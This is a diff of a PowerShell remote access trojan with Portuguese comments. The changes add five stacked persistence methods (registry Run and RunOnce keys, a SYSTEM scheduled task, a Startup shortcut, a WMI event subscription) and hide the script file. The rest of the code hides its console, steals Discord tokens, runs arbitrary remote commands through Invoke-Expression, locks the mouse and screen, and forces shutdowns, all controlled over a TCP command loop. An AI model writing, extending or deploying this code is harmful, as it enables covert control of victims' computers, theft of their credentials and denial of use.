@@ -18,23 +18,6 @@ $debugLog = "$env:TEMP\rat_debug.log"
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 $wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"
 
-# ===== TEXTO DO WALLPAPER HACKEADO =====
-$wallpaperText = @"
-VOCE FOI
-
-HACKEADO!
-
-SEU PC TA
-
-CRIPTOGRAFADO!
-
-CRYPTO-LOCKED
-
-ANLGUUR
-
-NOTTI GANG
-"@
-
 # ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
@@ -63,11 +46,6 @@ function Remove-UserFromRAT {
             $users = Get-Content $userListFile -ErrorAction SilentlyContinue
             $users = $users | Where-Object { $_ -ne $UserName }
             $users | Set-Content $userListFile -Force
-            $removido = $true
-        }
-        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
-        foreach ($task in $tasks) {
-            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
             $removido = $true
         }
         if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
@@ -136,42 +114,119 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== PERSISTÊNCIA MÚLTIPLA =====
+# ===== PERSISTÊNCIA MÚLTIPLA E REFORÇADA =====
 function Install-Persistence {
     try {
-        Write-DebugLog "Instalando persistência..."
+        Write-DebugLog "Instalando persistência múltipla..."
         
+        # Garantir que a pasta existe
         New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
+        
+        # Copiar script para local de instalação
         Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
         Write-DebugLog "Script copiado para: $scriptPath"
         
+        # ===== MÉTODO 1: REGISTRO (HKLM\Run) =====
         try {
             $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
             Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-            Write-DebugLog "Persistência adicionada ao registro"
+            Write-DebugLog "✓ Persistência adicionada ao registro (HKLM)"
         } catch {
-            Write-DebugLog "Erro ao adicionar ao registro: $_"
+            Write-DebugLog "✗ Erro no registro HKLM: $_"
+            
+            # Fallback para HKCU se HKLM falhar
+            try {
+                $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
+                Write-DebugLog "✓ Persistência adicionada ao registro (HKCU)"
+            } catch {
+                Write-DebugLog "✗ Erro no registro HKCU: $_"
+            }
         }
         
+        # ===== MÉTODO 2: TAREFA AGENDADA (MAIS CONFIÁVEL) =====
         try {
             $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
             $trigger = New-ScheduledTaskTrigger -AtStartup
             $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
             Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
-            Write-DebugLog "Persistência adicionada como tarefa agendada"
+            Write-DebugLog "✓ Tarefa agendada criada (SYSTEM)"
         } catch {
-            Write-DebugLog "Erro ao criar tarefa agendada: $_"
+            Write-DebugLog "✗ Erro na tarefa agendada: $_"
         }
         
+        # ===== MÉTODO 3: RUNONCE (EXECUTA MESMO SE OUTROS FALHAREM) =====
+        try {
+            $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+            Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
+            Write-DebugLog "✓ Persistência adicionada ao RunOnce"
+        } catch {
+            Write-DebugLog "✗ Erro no RunOnce: $_"
+        }
+        
+        # ===== MÉTODO 4: ATALHO NA PASTA DE INICIALIZAÇÃO =====
+        try {
+            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+            $shortcutPath = "$startupPath\$installName.lnk"
+            $WScriptShell = New-Object -ComObject WScript.Shell
+            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+            $shortcut.TargetPath = "powershell.exe"
+            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+            $shortcut.Save()
+            Write-DebugLog "✓ Atalho adicionado à pasta de inicialização"
+        } catch {
+            Write-DebugLog "✗ Erro ao criar atalho: $_"
+        }
+        
+        # ===== MÉTODO 5: WMI EVENT SUBSCRIPTION (AVANÇADO) =====
+        try {
+            $filterName = "RATFilter_$(Get-Random)"
+            $consumerName = "RATConsumer_$(Get-Random)"
+            
+            $filterArgs = @{
+                Name = $filterName
+                EventNameSpace = 'root\cimv2'
+                QueryLanguage = 'WQL'
+                Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+            }
+            $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
+            
+            $consumerArgs = @{
+                Name = $consumerName
+                CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+            }
+            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
+            
+            $bindingArgs = @{ Filter = $filter; Consumer = $consumer }
+            $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
+            Write-DebugLog "✓ WMI Event Subscription criada"
+        } catch {
+            Write-DebugLog "✗ Erro no WMI: $_"
+        }
+        
+        # Ocultar arquivo
         attrib +h +s +r $scriptPath
-        Write-DebugLog "Persistência instalada com sucesso"
+        Write-DebugLog "Arquivo ocultado"
+        Write-DebugLog "=" * 60
+        Write-DebugLog "PERSISTÊNCIA INSTALADA COM SUCESSO"
+        Write-DebugLog "=" * 60
+        
     } catch {
-        Write-DebugLog "Erro geral na instalação da persistência: $_"
+        Write-DebugLog "ERRO GERAL na persistência: $_"
     }
 }
 
+# ===== VERIFICAR SE JÁ ESTÁ INSTALADO =====
 if (-not (Test-Path $scriptPath)) {
     Install-Persistence
+} else {
+    # Verifica se o script atual é diferente do instalado (atualização)
+    $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
+    $installedScript = Get-Content $scriptPath -Raw -ErrorAction SilentlyContinue
+    if ($currentScript -ne $installedScript) {
+        Write-DebugLog "Script atualizado, reinstalando persistência"
+        Install-Persistence
+    }
 }
 
 # ===== FUNCOES BASICAS =====
@@ -263,13 +318,15 @@ public class Wallpaper {
 '@
         Add-Type -TypeDefinition $code -ErrorAction Stop
         [Wallpaper]::Set($wallpaperPath)
+        Write-DebugLog "Wallpaper aplicado com sucesso"
         return $true
     } catch {
+        Write-DebugLog "Erro ao aplicar wallpaper: $_"
         return $false
     }
 }
 
-# ===== TRAVAR MOUSE (VERSÃO AGRESSIVA - CANTO ESQUERDO) =====
+# ===== TRAVAR MOUSE (VERSÃO AGRESSIVA) =====
 $script:mouseLocked = $false
 $script:mouseThread = $null
 $script:mouseThread2 = $null
@@ -279,12 +336,12 @@ function Lock-Mouse {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
         Write-DebugLog "=" * 60
-        Write-DebugLog "TRAVANDO MOUSE NO CANTO ESQUERDO"
+        Write-DebugLog "TRAVANDO MOUSE"
         Write-DebugLog "=" * 60
         
         $script:mouseLocked = $true
         
-        # CAMADA 1: ClipCursor (API nativa - trava em área de 1 pixel)
+        # ClipCursor (API nativa)
         try {
             $cSharpCode = @'
 using System;
@@ -293,9 +350,6 @@ using System.Windows.Forms;
 public class MouseTrap {
     [DllImport("user32.dll")]
     public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [DllImport("user32.dll")]
-    public static extern bool SetCursorPos(int x, int y);
     
     [StructLayout(LayoutKind.Sequential)]
     public struct RECT {
@@ -309,7 +363,6 @@ public class MouseTrap {
         rect.right = 1;
         rect.bottom = 1;
         ClipCursor(ref rect);
-        SetCursorPos(0, 0);
     }
     
     public static void Unlock() {
@@ -324,12 +377,12 @@ public class MouseTrap {
 '@
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseTrap]::Lock()
-            Write-DebugLog "✓ ClipCursor aplicado (área de 1 pixel)"
+            Write-DebugLog "✓ ClipCursor aplicado"
         } catch {
             Write-DebugLog "✗ ClipCursor falhou: $_"
         }
         
-        # CAMADA 2: Thread ultra-rápida (1ms)
+        # Thread rápida
         $script:mouseThread = [System.Threading.Thread]::new({
             while ($script:mouseLocked) {
                 try {
@@ -340,189 +393,30 @@ public class MouseTrap {
         })
         $script:mouseThread.IsBackground = $true
         $script:mouseThread.Start()
-        Write-DebugLog "✓ Thread rápida iniciada (1ms)"
-        
-        # CAMADA 3: Thread de reforço (10ms - para garantir)
-        $script:mouseThread2 = [System.Threading.Thread]::new({
-            while ($script:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 10
-                } catch {}
-            }
-        })
-        $script:mouseThread2.IsBackground = $true
-        $script:mouseThread2.Start()
-        Write-DebugLog "✓ Thread de reforço iniciada"
-        
-        Write-DebugLog "=" * 60
-        Write-DebugLog "MOUSE TRAVADO COM SUCESSO"
-        Write-DebugLog "=" * 60
+        Write-DebugLog "✓ Thread rápida iniciada"
         
         return "MOUSE_LOCKED"
     } catch {
-        Write-DebugLog "ERRO ao travar mouse: $_"
+        Write-DebugLog "ERRO: $_"
         return "MOUSE_ERROR"
     }
 }
 
 function Unlock-Mouse {
     try {
-        Write-DebugLog "=" * 60
-        Write-DebugLog "LIBERANDO MOUSE"
-        Write-DebugLog "=" * 60
-        
         $script:mouseLocked = $false
         
-        # Liberar ClipCursor
-        try {
-            [MouseTrap]::Unlock()
-            Write-DebugLog "✓ ClipCursor liberado"
-        } catch {}
-        
-        # Parar threads
-        if ($script:mouseThread -and $script:mouseThread.IsAlive) {
-            $script:mouseThread.Abort()
-            Write-DebugLog "✓ Thread rápida abortada"
-        }
-        
-        if ($script:mouseThread2 -and $script:mouseThread2.IsAlive) {
-            $script:mouseThread2.Abort()
-            Write-DebugLog "✓ Thread de reforço abortada"
-        }
-        
-        Write-DebugLog "=" * 60
-        Write-DebugLog "MOUSE LIBERADO"
-        Write-DebugLog "=" * 60
+        try { [MouseTrap]::Unlock() } catch {}
+        if ($script:mouseThread -and $script:mouseThread.IsAlive) { $script:mouseThread.Abort() }
         
         return "MOUSE_UNLOCKED"
     } catch {
-        Write-DebugLog "ERRO ao liberar mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
     }
 }
 
-# ===== DEMAIS FUNÇÕES =====
-function Click-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-        return "OK"
-    } catch { 
-        return "CLICK_ERROR" 
-    }
-}
-
-function RightClick-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
-        return "OK"
-    } catch { 
-        return "RIGHTCLICK_ERROR" 
-    }
-}
-
-function Send-Key {
-    param($key)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($key)
-        return "OK"
-    } catch { 
-        return "KEY_ERROR" 
-    }
-}
-
-function Send-Text {
-    param($text)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($text)
-        return "OK"
-    } catch { 
-        return "TEXT_ERROR" 
-    }
-}
-
-function Get-FileList {
-    param($Path)
-    try {
-        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
-            [PSCustomObject]@{
-                Name = $_.Name
-                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
-            }
-        }
-        return ($items | ConvertTo-Json -Compress)
-    } catch { 
-        return "[]" 
-    }
-}
-
-function Execute-Command {
-    param($Cmd)
-    try {
-        $result = Invoke-Expression $Cmd 2>&1 | Out-String
-        return $result
-    } catch {
-        return "Erro: $_"
-    }
-}
-
-function Get-DiscordToken {
-    try {
-        $tokens = @()
-        $paths = @(
-            "$env:APPDATA\discord\Local Storage\leveldb",
-            "$env:APPDATA\discordptb\Local Storage\leveldb",
-            "$env:APPDATA\discordcanary\Local Storage\leveldb"
-        )
-        foreach ($path in $paths) {
-            if (Test-Path $path) {
-                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
-                    $matches = $regex.Matches($content)
-                    foreach ($match in $matches) { $tokens += $match.Value }
-                }
-            }
-        }
-        $tokens = $tokens | Select-Object -Unique
-        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
-        return "TOKENS:" + ($tokens -join "`n")
-    } catch {
-        return "TOKENS_ERROR"
-    }
-}
-
-function Get-ProcessList {
-    try {
-        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
-        return $processes
-    } catch {
-        return "PROCESS_ERROR"
-    }
-}
-
-function Open-Url {
-    param($url)
-    try {
-        Start-Process $url
-        return "URL_OPENED"
-    } catch {
-        return "URL_ERROR"
-    }
-}
-
-function Power-Control {
-    param($Action)
-    try {
-        switch ($Action) {
-            "shutdown" { Stop-Computer -Force }
-            "reboot" { Restart-Computer -Force }
-        }
-        return "POWER_$Action"
-    } catch { 
-        return "POWER_ERROR" 
-    }
-}
+# ===== TELA PRETA =====
+$script:blackScreenForm = $null
 
 function Black-Screen {
     try {
@@ -558,79 +452,38 @@ function Unlock-Screen {
     }
 }
 
-function Lock-Keyboard {
-    try {
-        $keyboardCode = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class KeyboardLocker {
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    public static void Lock() {
-        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
-            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-    
-    public static void Unlock() {
-        if (_hookID != IntPtr.Zero) {
-            UnhookWindowsHookEx(_hookID);
-            _hookID = IntPtr.Zero;
-        }
-    }
-    
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        return (IntPtr)1;
-    }
-}
-'@
-        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
-        [KeyboardLocker]::Lock()
-        return "KEYBOARD_LOCKED"
-    } catch {
-        return "KEYBOARD_ERROR"
-    }
-}
-
-function Unlock-Keyboard {
-    try {
-        [KeyboardLocker]::Unlock()
-        return "KEYBOARD_UNLOCKED"
-    } catch {
-        return "KEYBOARD_UNLOCK_ERROR"
-    }
-}
-
+# ===== LOCK TOTAL =====
 function Lock-Total {
     Lock-Mouse | Out-Null
     Black-Screen | Out-Null
-    Lock-Keyboard | Out-Null
     return "LOCK_TOTAL_ACTIVATED"
 }
 
 function Unlock-Total {
     Unlock-Mouse | Out-Null
     Unlock-Screen | Out-Null
-    Unlock-Keyboard | Out-Null
     return "LOCK_TOTAL_DEACTIVATED"
 }
+
+# ===== MOUSE / TECLADO =====
+function Move-Mouse { param($x,$y) try { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x,[int]$y); return "OK" } catch { return "MOUSE_ERROR" } }
+function Click-Mouse { try { [System.Windows.Forms.SendKeys]::SendWait("{ENTER}"); return "OK" } catch { return "CLICK_ERROR" } }
+function Send-Key { param($key) try { [System.Windows.Forms.SendKeys]::SendWait($key); return "OK" } catch { return "KEY_ERROR" } }
+
+# ===== COMANDOS =====
+function Get-FileList { param($Path) try { Get-ChildItem $Path -ErrorAction SilentlyContinue | Select-Object Name | ConvertTo-Json -Compress } catch { return "[]" } }
+function Execute-Command { param($Cmd) try { Invoke-Expression $Cmd 2>&1 | Out-String } catch { return "Erro: $_" } }
+function Get-DiscordToken {
+    try {
+        $tokens = @()
+        $paths = @("$env:APPDATA\discord\Local Storage\leveldb")
+        foreach ($path in $paths) { if (Test-Path $path) { Get-ChildItem "$path\*.ldb" | ForEach-Object { $content = Get-Content $_.FullName -Raw; $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}'); $matches = $regex.Matches($content); foreach ($match in $matches) { $tokens += $match.Value } } } }
+        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
+        return "TOKENS:" + ($tokens -join "`n")
+    } catch { return "TOKENS_ERROR" }
+}
+function Get-ProcessList { try { Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress } catch { return "PROCESS_ERROR" } }
+function Power-Control { param($Action) try { switch ($Action) { "shutdown" { Stop-Computer -Force } "reboot" { Restart-Computer -Force } } return "POWER_$Action" } catch { return "POWER_ERROR" } }
 
 # ===== CONEXAO PRINCIPAL =====
 while ($true) {
@@ -642,75 +495,45 @@ while ($true) {
         $writer.AutoFlush = $true
         
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
+        Write-DebugLog "Conectado ao servidor"
         
         while ($client.Connected) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            if ($cmd -eq "screenshot") {
-                $writer.WriteLine((Get-ScreenCapture))
-            } elseif ($cmd -eq "click") {
-                $writer.WriteLine((Click-Mouse))
-            } elseif ($cmd -eq "rightclick") {
-                $writer.WriteLine((RightClick-Mouse))
-            } elseif ($cmd -eq "discord") {
-                $writer.WriteLine((Get-DiscordToken))
-            } elseif ($cmd -eq "processes") {
-                $writer.WriteLine((Get-ProcessList))
-            } elseif ($cmd -eq "shutdown") {
-                $writer.WriteLine((Power-Control "shutdown"))
-            } elseif ($cmd -eq "reboot") {
-                $writer.WriteLine((Power-Control "reboot"))
-            } elseif ($cmd -eq "list_users") {
-                $writer.WriteLine((Get-RATUsers))
-            } elseif ($cmd -eq "remove_current_user") {
-                $writer.WriteLine((Remove-UserFromRAT $currentUser))
-            } elseif ($cmd -eq "lock_mouse") {
-                $writer.WriteLine((Lock-Mouse))
-            } elseif ($cmd -eq "unlock_mouse") {
-                $writer.WriteLine((Unlock-Mouse))
-            } elseif ($cmd -eq "black_screen") {
-                $writer.WriteLine((Black-Screen))
-            } elseif ($cmd -eq "unlock_screen") {
-                $writer.WriteLine((Unlock-Screen))
-            } elseif ($cmd -eq "lock_keyboard") {
-                $writer.WriteLine((Lock-Keyboard))
-            } elseif ($cmd -eq "unlock_keyboard") {
-                $writer.WriteLine((Unlock-Keyboard))
-            } elseif ($cmd -eq "lock_total") {
-                $writer.WriteLine((Lock-Total))
-            } elseif ($cmd -eq "unlock_total") {
-                $writer.WriteLine((Unlock-Total))
-            } elseif ($cmd -eq "set_wallpaper_hack") {
-                if (Create-HackWallpaper) {
-                    Set-Wallpaper
-                    $writer.WriteLine("WALLPAPER_HACK_SET")
-                } else {
-                    $writer.WriteLine("WALLPAPER_ERROR")
+            Write-DebugLog "Comando recebido: $cmd"
+            
+            if ($cmd -eq "screenshot") { $writer.WriteLine((Get-ScreenCapture)) }
+            elseif ($cmd -eq "click") { $writer.WriteLine((Click-Mouse)) }
+            elseif ($cmd -eq "discord") { $writer.WriteLine((Get-DiscordToken)) }
+            elseif ($cmd -eq "processes") { $writer.WriteLine((Get-ProcessList)) }
+            elseif ($cmd -eq "shutdown") { $writer.WriteLine((Power-Control "shutdown")) }
+            elseif ($cmd -eq "reboot") { $writer.WriteLine((Power-Control "reboot")) }
+            elseif ($cmd -eq "list_users") { $writer.WriteLine((Get-RATUsers)) }
+            elseif ($cmd -eq "remove_current_user") { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
+            elseif ($cmd -eq "lock_mouse") { $writer.WriteLine((Lock-Mouse)) }
+            elseif ($cmd -eq "unlock_mouse") { $writer.WriteLine((Unlock-Mouse)) }
+            elseif ($cmd -eq "black_screen") { $writer.WriteLine((Black-Screen)) }
+            elseif ($cmd -eq "unlock_screen") { $writer.WriteLine((Unlock-Screen)) }
+            elseif ($cmd -eq "lock_total") { $writer.WriteLine((Lock-Total)) }
+            elseif ($cmd -eq "unlock_total") { $writer.WriteLine((Unlock-Total)) }
+            elseif ($cmd -eq "set_wallpaper_hack") { 
+                if (Create-HackWallpaper -and (Set-Wallpaper)) { 
+                    $writer.WriteLine("WALLPAPER_HACK_SET") 
+                } else { 
+                    $writer.WriteLine("WALLPAPER_ERROR") 
                 }
-            } elseif ($cmd -eq "test") {
-                $writer.WriteLine("PONG")
-            } elseif ($cmd -eq "exit") {
-                break
-            } elseif ($cmd -match "^move (\d+) (\d+)$") {
-                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
-            } elseif ($cmd -match "^key (.+)$") {
-                $writer.WriteLine((Send-Key $matches[1]))
-            } elseif ($cmd -match "^type (.+)$") {
-                $writer.WriteLine((Send-Text $matches[1]))
-            } elseif ($cmd -match "^ls (.+)$") {
-                $writer.WriteLine((Get-FileList $matches[1]))
-            } elseif ($cmd -match "^exec (.+)$") {
-                $writer.WriteLine((Execute-Command $matches[1]))
-            } elseif ($cmd -match "^url (.+)$") {
-                $writer.WriteLine((Open-Url $matches[1]))
-            } elseif ($cmd -match "^remove_user (.+)$") {
-                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
-            } else {
-                $writer.WriteLine("Comando nao reconhecido")
             }
+            elseif ($cmd -eq "test") { $writer.WriteLine("PONG") }
+            elseif ($cmd -eq "exit") { break }
+            elseif ($cmd -match "^move (\d+) (\d+)$") { $writer.WriteLine((Move-Mouse $matches[1] $matches[2])) }
+            elseif ($cmd -match "^key (.+)$") { $writer.WriteLine((Send-Key $matches[1])) }
+            elseif ($cmd -match "^ls (.+)$") { $writer.WriteLine((Get-FileList $matches[1])) }
+            elseif ($cmd -match "^exec (.+)$") { $writer.WriteLine((Execute-Command $matches[1])) }
+            else { $writer.WriteLine("Comando nao reconhecido") }
         }
     } catch {
+        Write-DebugLog "Erro na conexao: $_"
         Start-Sleep -Seconds 10
     } finally {
         if ($client) { $client.Close() }
